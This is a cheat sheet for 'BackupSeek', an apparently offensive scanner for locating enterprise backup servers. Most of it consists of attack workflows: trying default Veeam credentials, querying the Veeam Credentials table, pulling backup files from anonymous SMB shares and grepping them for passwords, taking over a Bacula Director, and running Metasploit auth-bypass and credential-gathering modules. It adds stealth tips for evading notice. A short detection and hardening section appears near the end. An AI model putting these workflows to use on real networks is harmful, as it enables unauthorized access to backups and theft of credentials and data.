# BackupSeek Quick Reference

## Quick Start

```bash
# Basic scan
./backupseek.py iplist.txt

# Full comprehensive scan
./backupseek.py iplist.txt --full

# Vendor-specific
./backupseek.py iplist.txt --veeam
./backupseek.py iplist.txt --acronis
```

## Common Commands

### Discovery
```bash
# All backup systems
./backupseek.py targets.txt --full -v

# Fast scan (50 workers)
./backupseek.py targets.txt -w 50

# Slow/stealthy scan
./backupseek.py targets.txt -w 5 -t 10
```

### Vendor-Specific
```bash
# Veeam only
./backupseek.py targets.txt --veeam

# Acronis only
./backupseek.py targets.txt --acronis

# With verbose output
./backupseek.py targets.txt --veeam -v
```

## Output Files

| File | Description |
|------|-------------|
| `backuplist.txt` | List of backup servers found |
| `backup_details.txt` | Detailed findings with exploitation notes |
| `backup_details.json` | JSON export for automation |

## Backup Systems & Ports

### Veeam Backup & Replication
```
9392    Backup Service
9393    Data Mover Service
9401    Cloud Connect
9419    Enterprise Manager (Web UI)
6160    vPower NFS Service
```

**Web UI**: `https://server:9419`  
**Default Creds**: administrator/password, admin/admin

### Acronis Cyber Backup
```
9876    Acronis Backup Service
43234   Agent for Windows/Linux
44445   Management Server
```

**Web UI**: `https://server:44445` or `:9877`  
**Default Creds**: Varies by version

### Bacula
```
9101    Director (control daemon)
9102    File Daemon (client)
9103    Storage Daemon
```

**Config**: `/etc/bacula/bacula-dir.conf`  
**Password**: Director password in config

### Dell EMC Networker
```
7937    Dell Networker
7938    NSR Service
7939    Remote Exec
```

### IBM Spectrum Protect (TSM)
```
1500    Server communication
1501    Scheduler
1581    Web client
```

### CommVault
```
8400    CommCell communication
8401    Web console
8403    Firewall port
```

**Web UI**: `https://server:8401`

### Veritas NetBackup
```
1556     vnetd (master server)
13701    bprd (request daemon)
13702    bpdbm (database manager)
13720    bpcd (client daemon)
13724    vopied (media)
```

## Attack Workflows

### Workflow 1: Quick Discovery
```bash
# 1. Scan network
./backupseek.py targets.txt --full

# 2. Review findings
cat backuplist.txt
cat backup_details.txt

# 3. Extract web interfaces
grep "https://" backup_details.txt
```

### Workflow 2: Veeam Exploitation
```bash
# 1. Find Veeam servers
./backupseek.py targets.txt --veeam

# 2. Test default credentials
# Browse to: https://192.168.10.50:9419
# Try: administrator/password

# 3. Extract credentials from database
# Connect to SQL: VeeamBackup database
# Query: SELECT * FROM [dbo].[Credentials]
```

### Workflow 3: Backup Share Access
```bash
# 1. Full scan
./backupseek.py targets.txt --full

# 2. Test share access
smbclient //192.168.10.50/VeeamBackup -N

# 3. Download backups
smbclient //192.168.10.50/VeeamBackup -N -c 'ls'
smbclient //192.168.10.50/VeeamBackup -N -c 'get backup.vbk'

# 4. Extract credentials
strings backup.vbk | grep -i password
```

### Workflow 4: Bacula Compromise
```bash
# 1. Find Bacula servers
./backupseek.py targets.txt --full | grep Bacula

# 2. Access configuration (if possible)
cat /etc/bacula/bacula-dir.conf | grep Password

# 3. Connect to Director
bconsole
# Enter password when prompted

# 4. List and restore
*list jobs
*restore
```

## Manual Verification

### Test Veeam Manually
```bash
# Check ports
nmap -p 9392,9393,9419 192.168.10.50

# Test web interface
curl -k https://192.168.10.50:9419

# Test with credentials
curl -k -u "administrator:password" https://192.168.10.50:9419
```

### Test Acronis Manually
```bash
# Check ports
nmap -p 9876,43234,44445 192.168.10.50

# Test web interface
curl -k https://192.168.10.50:44445
```

### Test Backup Shares
```bash
# List shares
smbclient -L //192.168.10.50 -N

# Access backup share
smbclient //192.168.10.50/VeeamBackup -N

# With credentials
smbclient //192.168.10.50/VeeamBackup -U domain\\user
```

## Integration Examples

### With Nmap
```bash
# 1. Fast port discovery
nmap -p 9392,9393,9419,9876,44445,9101-9103 \
     192.168.10.0/24 -oG backup_ports.txt

# 2. Extract IPs
grep "open" backup_ports.txt | cut -d' ' -f2 > backup_ips.txt

# 3. Detailed scan
./backupseek.py backup_ips.txt --full
```

### With CrackMapExec
```bash
# 1. Discover backup servers
./backupseek.py targets.txt --full

# 2. Test credentials on shares
crackmapexec smb backuplist.txt -u admin -p 'P@ssw0rd' --shares
```

### With Metasploit
```bash
# Veeam authentication bypass
use auxiliary/scanner/veeam/veeam_backup_manager_auth_bypass
set RHOSTS file:backuplist.txt
run

# Credential extraction (post-exploitation)
use post/windows/gather/credentials/veeam_backup_manager
set SESSION 1
run
```

## Credential Extraction

### Veeam Database
```sql
-- Connect to VeeamBackup SQL database
SELECT 
    user_name,
    description,
    encrypted_password
FROM [dbo].[Credentials];

-- Decrypt requires:
-- 1. Local admin on Veeam server, OR
-- 2. Domain admin access, OR
-- 3. Veeam service account credentials
```

### Bacula Config
```bash
# Extract Director password
cat /etc/bacula/bacula-dir.conf | grep -A 5 "Console {"

# Output:
# Console {
#   Name = admin
#   Password = "MyDirectorPassword123"
# }
```

### Backup Files
```bash
# Search for credentials in backup files
strings backup.vbk | grep -i "password\|username\|credential"

# Extract from SQL backups
strings SQLBackup.bak | grep -E "password|pwd|passwd" -i

# Configuration backups
unzip backup.zip
grep -r "password" ./config/
```

## Common Options

```
Positional:
  input_file          File with IP addresses

Optional:
  --full              Full scan (all systems)
  --veeam             Veeam only
  --acronis           Acronis only
  -w, --workers N     Concurrent workers (default: 10)
  -t, --timeout N     Connection timeout (default: 3)
  -v, --verbose       Verbose output
```

## Detection Indicators

### Network
- Multiple connections to backup ports
- Sequential port scans (9392, 9393, 9419)
- Failed authentication to backup systems
- Unusual backup file downloads

### Logs
```
# Veeam Event Logs
Event ID 4625: Failed logon (repeated)
Event ID 4624: Successful logon from unusual source
Event ID 5140: Network share accessed

# Bacula Logs
grep "Failed auth" /var/log/bacula/bacula.log
grep "Connection from" /var/log/bacula/bacula.log

# Network Logs
Multiple SYN packets to ports 9392, 9419, 9876
```

## Defense Quick Tips

### Network Hardening
```bash
# Firewall rules (iptables)
# Allow only management subnet
iptables -A INPUT -p tcp --dport 9392 -s 192.168.200.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 9419 -s 192.168.200.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 9392:9419 -j DROP
```

### Authentication
```powershell
# Disable default accounts
# Change default passwords immediately
# Use MFA for web interfaces
# Implement certificate-based authentication

# Veeam: Enable MFA
# Backup & Replication > Options > Security
# Enable: Two-factor authentication
```

### Monitoring
```powershell
# Enable auditing
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable

# Alert on:
# - Failed login attempts (Event ID 4625)
# - Unusual access times
# - Backup file downloads
# - Configuration changes
```

## Troubleshooting

### No Systems Found
```bash
# Verify connectivity
ping 192.168.10.50

# Manual port check
nmap -p 9392,9393,9419 192.168.10.50

# Increase timeout
./backupseek.py targets.txt --timeout 10

# Verbose mode
./backupseek.py targets.txt -v
```

### Web Interface Not Detected
```bash
# Try manual access
curl -k https://192.168.10.50:9419

# Check HTTP (not HTTPS)
curl http://192.168.10.50:9419

# Verify SSL
openssl s_client -connect 192.168.10.50:9419
```

### Share Access Failed
```bash
# Install smbclient
sudo apt install smbclient

# Test manually
smbclient -L //192.168.10.50 -N

# Try with credentials
smbclient -L //192.168.10.50 -U domain\\user
```

## Tips & Tricks

### 🎯 Targeting
- **Dedicated subnets**: Look for backup-specific networks
- **DNS names**: backup, veeam, acronis, bacula
- **After hours**: Scan during backup windows
- **Follow the data**: Start with database servers

### 🔍 Discovery
- **Nmap first**: Fast port discovery before detailed scan
- **DNS enum**: `dig backup.company.com ANY`
- **Shodan**: Search for exposed Veeam consoles
- **Network diagrams**: Often show backup infrastructure

### 🔒 Stealth
- **Slow scans**: `-w 5 -t 10`
- **Blend in**: Backup traffic is expected
- **Off-hours**: Scan during backup jobs (noise cover)
- **Avoid web logins**: Without valid credentials

### ⚡ Speed
- **High workers**: `-w 50` for large networks
- **Targeted**: Use `--veeam` if vendor is known
- **Port reduction**: Scan primary ports only
- **Parallel instances**: Split network ranges

### 🎓 Learning
- **Lab setup**: Install Veeam/Acronis trials
- **Vendor certs**: Learn architecture through training
- **Read docs**: Security guides from vendors
- **Exploit-DB**: Search for known vulnerabilities

## One-Liners

```bash
# Quick discovery and web extraction
./backupseek.py targets.txt --full && grep "https://" backup_details.txt

# Find all Veeam servers
./backupseek.py targets.txt --veeam | grep "Veeam"

# Test all found shares
for ip in $(cat backuplist.txt); do smbclient -L //$ip -N; done

# Extract all backup server IPs
cat backup_details.json | jq -r '.[] | select(.status=="backup_found") | .ip'

# Count by vendor
cat backup_details.json | jq -r '.[] | .identified_systems[].system' | sort | uniq -c
```

## Real-World Examples

### Example 1: Enterprise Scan
```bash
./backupseek.py all_servers.txt --full -w 50
# Scanned: 5,000 servers
# Found: 24 backup servers (12 Veeam, 6 NetBackup, 4 CommVault, 2 Bacula)
# Time: ~45 minutes
```

### Example 2: Default Credentials Win
```bash
./backupseek.py targets.txt --veeam
# Found: 192.168.10.50 - Veeam
# Tested: administrator/password → SUCCESS
# Impact: Full access to all VM backups
```

### Example 3: Anonymous Share
```bash
./backupseek.py targets.txt --full
# Found: \\192.168.10.51\Backups (anonymous)
# Downloaded: SQL_BACKUP.bak
# Impact: Database credentials recovered
```

### Example 4: Bacula Misconfiguration
```bash
./backupseek.py targets.txt --full
# Found: Bacula server with exposed config
# Extracted: Director password
# Impact: Access to all backup catalogs
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success - backup systems found |
| 1 | No IPs to scan |

## Quick Reference Card

```
┌──────────────────────────────────────────────┐
│         BACKUPSEEK CHEAT SHEET               │
├──────────────────────────────────────────────┤
│ VEEAM                                        │
│  9392,9393    Backup services                │
│  9419         Web UI (administrator:password)│
├──────────────────────────────────────────────┤
│ ACRONIS                                      │
│  9876,44445   Management                     │
├──────────────────────────────────────────────┤
│ BACULA                                       │
│  9101         Director                       │
│  Config: /etc/bacula/bacula-dir.conf         │
├──────────────────────────────────────────────┤
│ EXPLOITATION                                 │
│  Default creds  Test web interfaces          │
│  Database       Extract Veeam creds          │
│  Shares         Access backup repositories   │
│  Configs        Extract from backup files    │
└──────────────────────────────────────────────┘
```

## Related Commands

```bash
# Port scanning
nmap -p 9392,9393,9419,9876,9101-9103 target

# Share enumeration
smbclient -L //target -N
enum4linux -S target

# Web testing
curl -k https://target:9419
nikto -h https://target:9419

# Database access (Veeam)
sqlcmd -S VEEAM-SERVER -d VeeamBackup -Q "SELECT * FROM Credentials"

# Bacula console
bconsole
```

## Learning Resources

- **Veeam Help Center**: https://helpcenter.veeam.com/
- **Acronis Documentation**: https://www.acronis.com/support/documentation/
- **Bacula Documentation**: https://www.bacula.org/documentation/
- **Backup Security**: NIST SP 800-209
- **MITRE ATT&CK**: T1213 (Data from Information Repositories)
